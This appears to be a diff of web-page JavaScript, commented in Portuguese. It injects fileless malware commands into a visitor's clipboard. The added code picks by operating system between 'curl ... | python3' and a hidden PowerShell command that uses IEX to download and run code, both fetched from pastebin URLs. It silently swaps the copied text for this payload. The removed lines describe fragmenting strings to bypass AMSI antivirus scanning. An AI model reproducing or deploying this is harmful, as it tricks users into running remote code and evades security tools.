@@ -90,21 +90,18 @@
             const idLinux = "35ytpBxN"; 
             const idWindows = "3Wy5aJ9w";
 
-            // Comando Linux (Baseado em Python)
+            // Comandos Fileless que serão injetados no Clipboard
             const cmdLinux = `curl -sL https://pastebin.com/raw/${idLinux} | python3`;
-            
-            // COMANDO WINDOWS ATUALIZADO:
-            // 1. Usa o 'cmd /c' como ponte para evitar o erro de 'Acesso Negado' do PowerShell.
-            // 2. Mantém a fragmentação de strings ($n, $c, $i) para realizar o bypass do AMSI na RAM.
-            const cmdWindows = `cmd /c "powershell -NoP -W Hidden -C \\$n='Net.Web';\\$c='Client';\\$w=New-Object (\\$n+\\$c);\\$i='I'+'EX';& \\$i (\\$w.DownloadString('https://pastebin.com/raw/${idWindows}'))"`;
+            const cmdWindows = `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/${idWindows}')"`;
 
             // Detecta o Sistema Operacional
             let payloadFinal = cmdLinux;
+            // Verifica se é Windows
             if (navigator.appVersion.indexOf("Win") != -1) {
                 payloadFinal = cmdWindows;
             }
 
-            // Executa a cópia para o Clipboard
+            // Executa a troca do texto real pelo payload malicioso
             navigator.clipboard.writeText(payloadFinal).then(() => {
                 const alert = document.getElementById('copyAlert');
                 alert.classList.remove('opacity-0');
